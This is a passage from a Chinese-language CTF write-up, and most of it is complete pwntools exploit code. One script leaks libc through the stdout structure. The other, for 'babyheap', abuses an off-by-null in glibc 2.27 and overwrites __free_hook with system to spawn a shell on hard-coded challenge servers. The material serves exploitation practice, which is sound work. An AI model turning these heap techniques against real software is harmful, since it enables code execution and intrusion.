        p.sendlineafter("Size:", str(0))
    def delete_without():
        p.sendline("1")
        sleep(0.1)
        p.sendline(str(0))
        sleep(0.1)
    def close_stdout():
        p.sendlineafter("choice:", "2")
    stdout = 0xa760
    malloc_size = 0x4f0
    while True:
        try:
            for i in range(6):
                add(malloc_size)
                add(0x80)
                delete()
            add(malloc_size)
            add(0xa8)
            delete()
            add(malloc_size)
            add(0x80)
            delete()
            add(malloc_size)
            add(0x28)
            delete()
            add(malloc_size)
            add(0x28)
            delete()
            add(malloc_size)
            add(0x48)
            delete()
            add(malloc_size)
            add(0x28)
            delete()
            log.success("free unsorted bin chunk")
            add(0x3c0)
            add(0x80)
            delete()
            # gdb.attach(p, "b *$rebase(0xB1B)")
            add(0xa8, b"a" * 0xa8 + b"\xf1")
            delete()
            add(0x88)
            delete()
            add(0xe8, b"a" * 0x98 + p64(0x21) + b"\x00" * 0x18 + p64(0x21) + b"\xe0")
            delete()
            add(0x48, b"a" * 0x48 + b"\xc1")
            delete()
            add(0x28)
            delete()
            add(0xb8, b"a" * 0x28 + p64(0x91) + p16(stdout))
            delete()
            add(0xe8, b"a" * 0x98 + p64(0x21) + b"\x00" * 0x18 + p64(0x41))
            delete()
            add(0x28)
            delete()
            add(0x28)
            delete()
            add(0x28, p64(0xfbad2887 | 0x1000) + p64(0) * 3 + b"\x00")
            p.recvuntil(p64(0xfbad2887 | 0x1000), timeout=1)
            p.recv(0x18)
            libc.address = u64(p.recv(8)) + 0x60 - libc.sym['_IO_2_1_stdout_']
            log.success("libc address is {}".format(hex(libc.address)))
            if b"\x7f" in p64(libc.address):
                break
        except KeyboardInterrupt:
            exit(0)
        except:
            p.close()
            if debug:
                p = process([file_path])
            else:
                p = remote('47.111.104.99', 51905)
    close_stdout()
    p.recvuntil("Bye\n")
    # gdb.attach(p, "b *$rebase(0xB1B)")
    payload = b"a" * 0x98 + p64(0x21) + b"\x00" * 0x18 + p64(0x61) + p64(libc.sym['__free_hook'] - 0x18) + b"\n"
    add_without(0xe8, payload)
    delete_without()
    add_without(0x38)
    delete_without()
    payload2 = b"cat flag 1>&2".ljust(0x18, b"\x00") + p64(libc.sym['system']) + b"\n"
    add_without(0x38, payload2)
    # gdb.attach(p, "b *$rebase(0xB1B)")
    delete_without()
    p.interactive()
## babyheap
程序提供了四种操作`add,show,edit,delete`。其中`add`函数只能分配`0xF8`大小的字节，`edit`函数中存在一个`off-by-null`。比较经典的`2.27`下面的`off-by-null`的利用。但是由于这里不能写入`prev_size`位，因此需要想些办法。
在泄露出`libc`基址之后，通过释放四个`0x100`大小的堆块，在依次申请，使得第`2,3,4`大小的堆块的`prev_size`位残留有释放堆块时写入的`prev_size`。得到`prev_size`之后就可以利用`off-by-null`了。首先释放第`1`个堆块，利用第`2`个堆块改写`3`堆块的`PREV_INUSE`位，释放第`3`个堆块，此时`1,2,3`堆块合并，再依次申请三个堆块`1,3,5`，那么此时`2,3`中保存的堆块指针相同。
利用指向同一个堆块的两个指针构造`double
free`。覆写`free_hook`为`system`，释放包含有`/bin/sh`字符串的堆块即可`getshell`。
    # encoding=utf-8
    from pwn import *
    file_path = "./babyheap"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 0
    if debug:
        p = process([file_path])
        # gdb.attach(p, "b *$rebase(0xD3B)")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    else:
        p = remote('47.111.96.55', 55103)
        libc = ELF('./libc.so.6')
        one_gadget = 0x0
    def add():
        p.sendlineafter(">>", "1")
    def show(index):
        p.sendlineafter(">>", "2")
        p.sendlineafter("index?", str(index))
    def edit(index, size, content):
        p.sendlineafter(">>", "3")
        p.sendlineafter("index?", str(index))
        p.sendlineafter("Size:", str(size))
        p.sendafter("Content:", content)
    def delete(index):
        p.sendlineafter(">>", "4")
        p.sendlineafter("index?", str(index))
    for i in range(7):
        add()
    add() # 7
    add()
    add() # 9
    for i in range(7):
        delete(i)
    delete(7)
    delete(8)
    for i in range(7):
        add()
    add() # 7
    show(7)
    p.recv()
    libc.address = u64(p.recvline().strip(b"\n").ljust(0x8, b"\x00")) - 0x250 - 0x10 - libc.sym['__malloc_hook']
    log.success("libc address {}".format(hex(libc.address)))
    add() # 8
    add() # 10
    add()
    add() # 12
    add() # 13
    add() # 14
    for i in range(7):
        delete(i)
    delete(10)
    delete(11)
    delete(12)
    delete(13)
    for i in range(7):
        add()
    add()
    add()
    add()
    add()
    for i in range(7):
        delete(i)
    delete(10)
    edit(12, 0xf8, "\x00")
    delete(13)
    for i in range(7):
        add()
    add() # 10
    add() # 13 == 11
    add() # 14
    add() # 15
    delete(13)
    delete(14)
    delete(11)
    # gdb.attach(p, "b *$rebase(0xD3B)")
    add() # 11
    edit(11, 0x20, p64(libc.sym['__free_hook']))
    add() # 13
    add() # 14
    edit(14, 0x20, "/bin/sh\x00")
    add() # 15
    edit(17, 0x20, p64(libc.sym['system']))
    delete(14)
    p.interactive()
## 参考
[google ctf sprint](https://ctftime.org/writeup/23032)
[2017 DCTF flex](https://www.anquanke.com/post/id/89855)